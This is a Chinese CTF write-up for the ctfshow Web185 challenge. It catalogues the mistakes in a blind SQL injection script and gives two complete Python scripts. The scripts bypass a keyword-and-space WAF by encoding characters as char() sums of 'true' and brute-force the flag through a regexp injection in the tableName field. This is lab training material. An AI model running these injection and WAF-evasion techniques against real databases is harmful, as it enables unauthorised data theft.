# 🔥 Web185 脚本错误整理（按致命程度排序）

> 以下是从初稿到修改版中出现的 **全部错误汇总**，涵盖 **语法 / WAF / 逻辑 / 网络** 四大类，修正后即可稳定跑出 flag。

------

## 一、Python 基础语法错误（直接导致脚本崩溃 / 不执行）

| 编号 | 错误点            | 错误代码                                  | 原因                                       | ✅ 正确写法                                |
| :--: | ----------------- | ----------------------------------------- | ------------------------------------------ | ----------------------------------------- |
|  1   | `for`循环遍历整数 | `for _ in asc:`                           | `ord(ch)`返回的是整数，Python 不能遍历整数 | `for _ in range(asc):`                    |
|  2   | f-string 写法错误 | `payload="...regexp(f{concat1(flag+x)})"` | `f`写在字符串里只是普通字符，函数不会执行  | `payload=f"...regexp({concat1(flag+x)})"` |

------

## 二、Web185 WAF 绕过错误（直接被靶场拦截）

| 编号 | 错误点           | 错误代码                                 | 原因                                          | ✅ 正确写法                                                   |
| :--: | ---------------- | ---------------------------------------- | --------------------------------------------- | ------------------------------------------------------------ |
|  3   | Payload 包含空格 | `ctfshow_user group by pass having pass` | Web185 黑名单 **禁用所有空格**（含换行、Tab） | 用 `()`替代空格： `ctfshow_user(group)(by)(pass)(having)(pass)` |

------

## 三、逻辑 / 匹配错误（永远猜不到 flag，脚本卡死）

| 编号 | 错误点              | 错误代码                                             | 原因                                        | ✅ 正确写法                         |
| :--: | ------------------- | ---------------------------------------------------- | ------------------------------------------- | ---------------------------------- |
|  4   | 响应结果匹配错误    | `if 'user_count=1' in response:`                     | 靶场实际返回 `user_count = 1`（带空格）     | `if 'user_count = 1' in response:` |
|  5   | `break`跳出循环错误 | 内层 `break`                                         | `break`只能退出当前循环，猜对 `}`也无法结束 | 外层循环判断 `}`，直接终止整个脚本 |
|  6   | 字符集冗余          | `flag_str="0123456789-_}qwertyuiopasdfghjklzxcvbnm"` | 包含大量无用字符，严重拖慢猜解              | `flag_str="0123456789abcdef-{}"`   |

------

## 四、网络 / 稳定性错误（SSL / 连接断开 / 卡死）

| 编号 | 错误点       | 错误表现                         | ✅ 修复方式                                   |
| :--: | ------------ | -------------------------------- | -------------------------------------------- |
|  7   | 无异常捕获   | 网络波动或靶场拦截直接崩溃       | 给请求加 `try-except`，失败自动重试          |
|  8   | 无请求超时   | 靶场不响应时脚本无限卡死         | `requests.post(..., timeout=10)`             |
|  9   | 长连接未关闭 | 被靶场防火墙识别为攻击，主动断开 | 加请求头： `headers={"Connection": "close"}` |

------

## ✅ 总结：只错在 3 大类

```
1️⃣ Python 语法错误（循环、f-string）
2️⃣ WAF 规则绕过错误（空格未处理）
3️⃣ 脚本稳定性问题（无容错、无延迟、无超时）
```

🎯 **核心绕 WAF 逻辑（`char + concat + true 加法`）是完全正确的！**

修复以上所有问题后，脚本即可 **稳定、快速、完整** 地跑出 flag 🚩

```python
//我的脚本
import requests
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url="https://07c9017a-79a1-4a0d-9e16-5880573b0328.challenge.ctf.show/select-waf.php"
flag="ctfshow{"
flag_str="0123456789-_}qwertyuiopasdfghjklzxcvbnm"
def char1(ch):
    asc=ord(ch)
    b="char("
    for _ in range(asc):
        b+="true+"
    return b[:-1]+"),"
def concat1(string):
    c="concat("
    for i in string:
        c+=char1(i)
    return c[:-1]+")"
for i in range(1,50):
    for x in flag_str:
        payload=f"ctfshow_user group by pass having pass regexp({concat1(flag+x)})"
        data={"tableName":payload}
        response=requests.post(url,data=data,verify=False).text
        if 'user_count = 1' in response:
            flag+=x
            print(f"当前flag是：{flag}")
            break
    if '}' in flag:
        print(f"最终flag是：{flag}")
        break
    time.sleep(0.2)
```

```python
//别人的脚本
import requests
import time
# 关闭SSL警告
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 靶场URL
url = "https://927cabff-eb0d-4983-a98e-df741835ad1d.challenge.ctf.show/select-waf.php"
flag = 'ctfshow{'
# flag字符集（CTFshow标准格式）
flagstr = '0123456789abcdef-{}'

# 核心：字符转 true加法 + char() 绕过WAF
def char2boolean(ch):
    num = ord(ch)
    temp = "char("
    for _ in range(num):
        temp += "true+"
    return temp[:-1] + "),"

# 拼接字符串
def formatString(str):
    temp = 'concat('
    for x in str:
        temp += char2boolean(x)
    return temp[:-1] + ")"

# 主爆破循环
for _ in range(50):
    for x in flagstr:
        data = {
            "tableName": f"ctfshow_user group by pass having pass regexp({formatString(flag+x)})"
        }
        # ✅ 关键修复：加 verify=False 关闭SSL证书验证
        res = requests.post(url=url, data=data, verify=False)
        
        # 判断是否匹配成功
        if "user_count = 1" in res.text:
            flag += x
            print(f"[+] 当前flag：{flag}")
            break
    # 遇到}结束
    if '}' in flag:
        print(f"\n🎉 成功拿到flag：{flag}")
        break
    time.sleep(0.2)
```
